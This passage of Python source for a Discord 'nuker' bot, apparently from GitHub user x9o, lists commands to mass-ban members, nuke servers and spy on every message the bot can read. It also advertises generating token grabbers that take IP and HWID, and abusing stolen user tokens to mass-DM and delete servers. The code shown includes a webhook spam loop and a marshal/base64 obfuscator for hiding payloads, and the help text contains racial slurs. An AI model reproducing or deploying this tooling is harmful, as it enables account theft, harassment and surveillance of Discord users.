            help_embed.add_field(name='🚮 Role Purge (Cannot delete roles above the bot)', value=f'`{bot.command_prefix}rolepurge <serverid>`', inline=False)
            help_embed.add_field(name='🪓 Massban', value=f'Bans everyone in this server.`{bot.command_prefix}massban`', inline=False)
            help_embed.set_footer(text="Github: x9o")

            await interaction.response.send_message(embed=help_embed, ephemeral=True)

        if select.values[0] == "Utils":
            helpembed = discord.Embed(title='Utilities', color=discord.Color.green())
            helpembed.add_field(name='👟 Leave', value=f'Leaves the server\n`{bot.command_prefix}leave <serverid>`', inline=False)
            helpembed.add_field(name='🔗 Link', value=f'Bot Invite link\n`{bot.command_prefix}link`', inline=False)
            helpembed.add_field(name='🏫 Server Info', value=f"When you can't get the server ID for some reason.\n`{bot.command_prefix}servinfo`", inline=False)
            helpembed.add_field(name='📃 Server List', value=f'Shows a list of servers the bot is in for you to nuke.\n`{bot.command_prefix}servlist`', inline=False)
            helpembed.add_field(name='🧼 Clear', value=f'Deletes all messages sent by the bot\n`{bot.command_prefix}clear <serverid>`', inline=False)
            helpembed.add_field(name='❗ Set Prefix', value=f'Owner only\n`{bot.command_prefix}setprefix <prefix>`', inline=False)
            helpembed.add_field(name='🗿 Set Status', value=f'Owner only\n`{bot.command_prefix}setstatus <status>`', inline=False)
            helpembed.add_field(name='🗣️ Say', value=f'Says some bullshit you want\n`{bot.command_prefix}say <msg>`', inline=False)
            helpembed.add_field(name='🔨 Ban', value=f'`{bot.command_prefix}ban <userid> <reason>`', inline=False)
            helpembed.add_field(name='⚒️ UnBan', value=f'`{bot.command_prefix}unban <userid>`', inline=False)
            helpembed.add_field(name='🥷 DM', value=f'DM someone\n`{bot.command_prefix}dm <userid> <msgcontent>`', inline=False)
            helpembed.add_field(name=':baby: Avatar', value=f'Check the avatar sum nigga\n`{bot.command_prefix}avatar <user>`', inline=False)
            helpembed.set_footer(text="Github: x9o")

            await interaction.response.send_message(embed=helpembed, ephemeral=True)
        
        if select.values[0] == "Spy":
            global messagespy
            global auditlogspy
            global banspy
            global userprofilespy
            global leavespy
            global deletespy
            global editspy

            helpxembed = discord.Embed(title='Spy', color=discord.Color.greyple())
            helpxembed.add_field(name='💬 Message spy', value=f'Sends EVERY single message the bot has access to from all servers the bot is in.\n🚨 YOUR WEBHOOK MUST BE IN A CHANNEL NAMED "spy" 🚨\n⚠️ MESSAGES WILL NOT BE DETECTED IN THE CHANNEL "spy". ⚠️\n[{bot.command_prefix}messagespytoggle <on/off> <webhook>]\nStatus: {messagespy}', inline=False)
            helpxembed.add_field(name='📜 Audit log spy', value=f'[{bot.command_prefix}auditspytoggle <on/off>]\nStatus: {auditlogspy}', inline=False)
            helpxembed.add_field(name='🔴 User profile spy [BROKEN]', value=f'Let you know when a user changes anything from their profile.\n[{bot.command_prefix}profilespytoggle <on/off>]\nStatus: {userprofilespy}', inline=False)
            helpxembed.add_field(name='🗡️ Ban spy', value=f'Let you know when a user gets banned.\n[{bot.command_prefix}banspytoggle <on/off>]\nStatus: {banspy} ', inline=False)
            helpxembed.add_field(name='🏃 Leave spy', value=f'Useless ass feature\n[{bot.command_prefix}leavespytoggle <on/off>]\nStatus: {leavespy} ', inline=False)
            helpxembed.add_field(name='🗑️ Spy deleted messages', value=f'Let you know when a message gets deleted.\n[{bot.command_prefix}deletespytoggle]\nStatus: {deletespy} ', inline=False)
            helpxembed.add_field(name='✍️ Spy edited messsages', value=f'Let you know when someone edits a message.\n[{bot.command_prefix}editspytoggle]\nStatus: {editspy} ', inline=False)
            helpxembed.set_footer(text="Github: x9o")


            await interaction.response.send_message(embed=helpxembed, ephemeral=True)

        if select.values[0] == "Malicious":
            helpzembed = discord.Embed(title='Side features', color=discord.Color.dark_gold())
            helpzembed.add_field(name='🪝 Webhook Spammer', value=f'`{bot.command_prefix}webhookspam <webhook> <msgcontent>`', inline=False)
            helpzembed.add_field(name='🗑️ Webhook Deleter', value=f'`{bot.command_prefix}webhookdelete <webhook>`', inline=False)
            helpzembed.add_field(name='🎠 Token grabber generator', value=f'Generates a token grabber in python. Also grabs IP, HWID, etc.\n`{bot.command_prefix}tokengrabber <webhook> <obfuscate: true/false> <mode: exe/py>`\nObfuscation is recommended for performance.\nEXE mode is unstable, I dont recommend using it.', inline=False)
            helpzembed.add_field(name='💸 Token Information', value=f'Provides full information on a user token. Billing info will also be grabbed if any.\n`{bot.command_prefix}tokinfo <token>`', inline=False)
            helpzembed.set_footer(text="Github: x9o")

            await interaction.response.send_message(embed=helpzembed, ephemeral=True)

        if select.values[0] == "Misc":
            xembedz = discord.Embed(title='Info', color=discord.Color.blurple())
            xembedz.add_field(name='<:github:1168890688943968256> Github', value=f'Returns information of a github user\n`{bot.command_prefix}github <targetusername>`', inline=False)
            xembedz.add_field(name='<:niggawifi:1169653037804048384> IP Address', value=f'Returns information of an IP address with geolocation\n`{bot.command_prefix}ip <ipaddress>`', inline=False)
            xembedz.set_footer(text="Github: x9o")

            await interaction.response.send_message(embed=xembedz, ephemeral=True)

        if select.values[0] == "Fun":
            xembed = discord.Embed(title='Random stuff', color=discord.Color.dark_magenta())
            xembed.add_field(name='💩 Shitpost', value=f'Random post from reddit\n`{bot.command_prefix}shitpost <subreddit>`', inline=False)
            xembed.add_field(name='🦜 Yap', value=f'Say something interesting\n`{bot.command_prefix}yap <length> <lang: en/zh/all>`', inline=False)
            xembed.set_footer(text="Github: x9o")

            await interaction.response.send_message(embed=xembed, ephemeral=True)


        if select.values[0] == "User Nuke":
            xsembed = discord.Embed(title='User token functions', color=discord.Color.dark_gold())
            xsembed.add_field(name='🗑️ Remove friends', value=f'\n`{bot.command_prefix}removefriends <token>`', inline=False)
            xsembed.add_field(name='🛡️ Block friends', value=f'\n`{bot.command_prefix}blockfriends <token>`', inline=False)
            xsembed.add_field(name='⚙️ Cycle settings', value=f'\n`{bot.command_prefix}cyclesettings <token>`', inline=False)
            xsembed.add_field(name='🫠 Close DMS', value=f'\n`{bot.command_prefix}closedms <token>`', inline=False)
            xsembed.add_field(name='🐝 Mass DM', value=f'\n`{bot.command_prefix}massdm <token> <msg>`', inline=False)
            xsembed.add_field(name='🧻 Delete servers', value=f'\n`{bot.command_prefix}deleteservers <token>`', inline=False)
            xsembed.add_field(name='💎 Hypesquad changer', value=f'\n`{bot.command_prefix}housechange <house> <token>`', inline=False)
            xsembed.set_footer(text="Github: x9o")

            await interaction.response.send_message(embed=xsembed, ephemeral=True)

        if select.values[0] == "Github":
            await ctx.reply("🤖 [Bot Repo](https://github.com/x9o/Bithub)\n🐦‍⬛ [Profile](https://github.com/x9o/)")
            

    select.callback = callback

    view = discord.ui.View()
    view.add_item(select)

    await ctx.send(embed=helprembed, view=view)


# USER TOKEN FUNCTIONS #
#=========================================================================================#

@bot.command()
async def housechange(ctx, house, token):
    x = hypesquadchanger(house, token)
    await ctx.reply(x)


@bot.command()
async def removefriends(ctx, token):
    x = remove_friends(token)
    await ctx.reply(x)

@bot.command()
async def blockfriends(ctx, token):
    x = block_friends(token)
    await ctx.reply(x)

@bot.command()
async def cyclesettings(ctx, token):
    startmsg = await ctx.send("⚙️ Starting....")
    x = settings(token)
    if x:
        await ctx.reply(x)
        await startmsg.delete()
    


@bot.command()
async def closedms(ctx, token):
    x = dms_close(token)
    await ctx.reply(x)

@bot.command()
async def massdm(ctx, token, msg):
    x = mass_dm(token, msg)
    await ctx.reply(x)


@bot.command()
async def deleteservers(ctx, token):
    x = delete_servers(token)
    await ctx.reply(x)


#                    non bot functions                                      #

#=========================================================================================#




 
def obfuscate(content):
    compiled_code = compile(content, '<string>', 'exec')
        # Marshal the compiled code
    marshalled_code = marshal.dumps(compiled_code)
        # Base64 encode the marshalled code
    encoded_code = base64.b64encode(marshalled_code).decode('latin1')

    rvn = ''.join(random.choice(string.ascii_letters) for _ in range(5))

    obfuscated_code = f'''
import base64
import marshal

# You can put shit code here or remove this line.

{rvn} = {encoded_code!r}
exec(marshal.loads(base64.b64decode({rvn}.encode('latin1'))))
'''
    
    return obfuscated_code

async def send_messages(channel, num_messages, message_content):
    for _ in range(num_messages):
        await channel.send(message_content)




def webhookfuck(WebHook, Message):
    while True:
        response = requests.post(
            WebHook,
            json = {"content" : Message},
            params = {'wait' : True}
        )
        try:
            
            if response.status_code == 204 or response.status_code == 200:
                print("Sent")
            elif response.status_code == 429:
                print("rate limited")
                
                time.sleep(response.json()["retry_after"] / 1000)
            else:
                print("error")

            time.sleep(.01)
        except KeyboardInterrupt:
            break

def deletewebhook(webhook):
    try:
        requests.delete(webhook.rstrip())
        holder = "✅ Webhook has been deleted."
        return holder
    except:
        holder = "❌ Webhook could not be deleted."
        return holder


def ipinfo(address):
    url = f"http://ip-api.com/json/{address}"
    response = requests.get(url)
    data = response.json()
    
    if data["status"] == "success":
        country = data["country"]
        city = data["city"]
        zipcode = data["zip"]
        isp = data["isp"]
        timezone = data["timezone"]
        latitude = data["lat"]
        longtitude = data["lon"]
        asn = data["as"]
        location = f"https://earth.google.com/web/search/{latitude}+{longtitude}"
        regioname = data["regionName"]
    
        
        
        if "proxy" in data:
            prox = "True"
        else:
            prox = "False"

        hostname = socket.gethostbyaddr(address)[0]
        
        return country, city, zipcode, isp, timezone, latitude, longtitude, location, hostname, prox, asn, regioname
        
    else:
        error = "❌ Invalid IP/Error."
        return error



color_codes = [
    "0xff4500",
    "0xFAEBD7",
    "0x00FFFF",
    "0x7FFFD4",
    "0xF0FFFF",
    "0xF5F5DC",
    "0xFFE4C4",
    "0x000000",
    "0xFFEBCD",
    "0x0000FF",
    "0x8A2BE2",
    "0xA52A2A",
    "0xDEB887",
    "0x5F9EA0",
    "0x7FFF00",
    "0xD2691E",
    "0xFF7F50",
    "0x6495ED",
    "0xFFF8DC",
    "0xDC143C",
    "0x00FFFF",
    "0x00008B",
    "0x008B8B",
    "0xB8860B",
    "0xA9A9A9",
    "0x006400",
    "0xBDB76B",
    "0x8B008B",
    "0x556B2F",
]




        


        

bot.run(TOKEN)
